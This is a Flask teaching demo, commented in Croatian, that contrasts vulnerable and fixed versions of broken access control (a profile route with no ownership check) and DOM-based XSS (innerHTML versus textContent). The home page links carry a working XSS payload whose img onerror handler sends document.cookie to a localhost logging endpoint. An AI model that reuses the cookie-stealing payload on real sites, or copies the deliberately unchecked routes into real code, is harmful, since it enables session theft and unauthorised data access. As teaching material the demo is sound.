from flask import Flask, session, render_template_string, redirect

app = Flask(__name__)
app.secret_key = "demo-secret"

USERS = {
    "1": {"username": "vito", "podaci": "Vitova tajna poruka / privatni podaci"},
    "2": {"username": "nika",  "podaci": "Nikina tajna poruka / privatni podaci"},
}

# zajednicki CSS da sve stranice lijepo izgledaju
STYLE = """
<style>
  body {
    font-family: system-ui, sans-serif;
    max-width: 600px;
    margin: 60px auto;
    background: #f5f6f8;
    color: #222;
  }
  h1 { font-size: 1.4rem; }
  .card {
    background: white;
    border-radius: 12px;
    padding: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
  }
  .btn {
    display: inline-block;
    padding: 10px 18px;
    margin: 6px 6px 6px 0;
    border-radius: 8px;
    text-decoration: none;
    font-weight: 600;
    color: white;
  }
  .btn-login { background: #3b82f6; }
  .btn-safe { background: #16a34a; }
  .btn-vuln { background: #dc2626; }
  .result {
    margin-top: 16px;
    padding: 14px;
    border-radius: 8px;
    font-size: 0.95rem;
  }
  .result-ok { background: #dcfce7; border: 1px solid #16a34a; }
  .result-fail { background: #fee2e2; border: 1px solid #dc2626; }
  .muted { color: #666; font-size: 0.9rem; }
  a.back { display: inline-block; margin-top: 16px; color: #3b82f6; }
</style>
"""

HOME_HTML = """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Broken Access Control - Demo</title>{{ style|safe }}</head>
<body>
  <div class="card" style="margin-bottom:24px">
    <h1>Broken Access Control - Demo</h1>
    <p class="muted">Trenutno ulogiran: <b>{{ current }}</b></p>
    <p>Uloguj se kao:</p>
    <a class="btn btn-login" href="/login/1">Vito (id 1)</a>
    <a class="btn btn-login" href="/login/2">Nika (id 2)</a>
    <a class="btn" style="background:#6b7280" href="/logout">Nitko (odjava)</a>
    <hr style="margin:24px 0; border:none; border-top:1px solid #eee;">
    <a href="/dashboard" style="font-weight:600">Idi na dashboard &rarr;</a>
  </div>

  <div class="card">
    <h1>Demo za XSS</h1>
    <p><b>Odaberite jednu od opcija:</b></p>
    <a class="btn" style="background:#dc2626" href='/nesigurno?ime=<img src=x onerror="new Image().src=%27http://localhost:9000/log?c=%27%2Bdocument.cookie">'>RANJIVO (XSS)</a>
<a class="btn" style="background:#16a34a" href='/sigurno?ime=<img src=x onerror="new Image().src=%27http://localhost:9000/log?c=%27%2Bdocument.cookie">'>SIGURNO (bez XSS)</a>
  </div>
</body></html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Dashboard</title>{{ style|safe }}</head>
<body>
  <div class="card">
    <h1>Dashboard</h1>
    <p class="muted">Trenutno ulogiran: <b>{{ current }}</b></p>

    <p><b>Profil 1 (vito)</b></p>
    <a class="btn btn-vuln" href="/profile-vuln/1">Otvori RANJIVO</a>
    <a class="btn btn-safe" href="/profile-safe/1">Otvori SIGURNO</a>

    <p style="margin-top:20px"><b>Profil 2 (nika)</b></p>
    <a class="btn btn-vuln" href="/profile-vuln/2">Otvori RANJIVO</a>
    <a class="btn btn-safe" href="/profile-safe/2">Otvori SIGURNO</a>

    {% if result %}
      <div class="result {{ 'result-ok' if ok else 'result-fail' }}">{{ result|safe }}</div>
    {% endif %}

    <br>
    <a class="back" href="/">&larr; Natrag na pocetnu / promjena korisnika</a>
  </div>
</body></html>
"""

HTML_SIGURNO="""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Dobrodošli (SIGURNA verzija)</title>
</head>
<body>
  <h1>Dobrodošli (SIGURNA verzija)</h1>
  <p id="pozdrav"></p>

  <script>
    document.cookie = "sessionid=abc123";

    const params = new URLSearchParams(location.search);
    const ime = params.get("ime") || "gost";

    // SIGURNO: korisnički ulaz ide kao čisti tekst, ne kao HTML
    document.getElementById("pozdrav").textContent = "Pozdrav, " + ime;
  </script>
</body>
</html>
"""

HTML_NESIGURNO="""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Dobrodošli (RANJIVA verzija)</title>
</head>
<body>
  <h1>Dobrodošli (RANJIVA verzija)</h1>
  <p id="pozdrav"></p>

  <script>
    document.cookie = "sessionid=abc123";

    const params = new URLSearchParams(location.search);
    const ime = params.get("ime") || "gost";

    // RANJIVO: korisnički ulaz ide direktno u DOM kao HTML
    document.getElementById("pozdrav").innerHTML = "Pozdrav, " + ime;
  </script>
</body>


</html>
"""


def current_user_label():
    uid = session.get("user_id")
    return USERS[uid]["username"] if uid else "nitko"


@app.route("/")
def home():
    return render_template_string(HOME_HTML, style=STYLE, current=current_user_label())


@app.route("/login/<user_id>")
def login(user_id):
    if user_id in USERS:
        session["user_id"] = user_id
    return redirect("/dashboard")


@app.route("/logout")
def logout():
    session.pop("user_id", None)
    return redirect("/")


@app.route("/dashboard")
def dashboard():
    return render_template_string(DASHBOARD_HTML, style=STYLE, current=current_user_label(),
                                   result=None, ok=False)


# RANJIVO: ne provjerava pripada li profil ulogiranom korisniku
@app.route("/profile-vuln/<user_id>")
def profile_vuln(user_id):
    podaci = USERS[user_id]["podaci"]
    result = f"<b>RANJIVA ruta - profil {user_id}:</b><br>{podaci}<br><span class='muted'>(nema provjere vlasnistva - vraceno svima)</span>"
    return render_template_string(DASHBOARD_HTML, style=STYLE, current=current_user_label(),
                                   result=result, ok=False)


# SIGURNO: provjerava session['user_id'] prije prikaza
@app.route("/profile-safe/<user_id>")
def profile_safe(user_id):
    if session.get("user_id") != user_id:
        result = f"<b>403 - Zabranjen pristup</b><br>Profil {user_id} ne pripada ulogiranom korisniku."
        return render_template_string(DASHBOARD_HTML, style=STYLE, current=current_user_label(),
                                       result=result, ok=False), 403

    podaci = USERS[user_id]["podaci"]
    result = f"<b>SIGURNA ruta - profil {user_id}:</b><br>{podaci}<br><span class='muted'>(pristup odobren jer session odgovara trazenom id-u)</span>"
    return render_template_string(DASHBOARD_HTML, style=STYLE, current=current_user_label(),
                                   result=result, ok=True)

@app.route("/nesigurno")
def nesigurno():
    return render_template_string(HTML_NESIGURNO)


@app.route("/sigurno")
def sigurno():
    return render_template_string(HTML_SIGURNO)

if __name__ == "__main__":
    app.run(port=5000)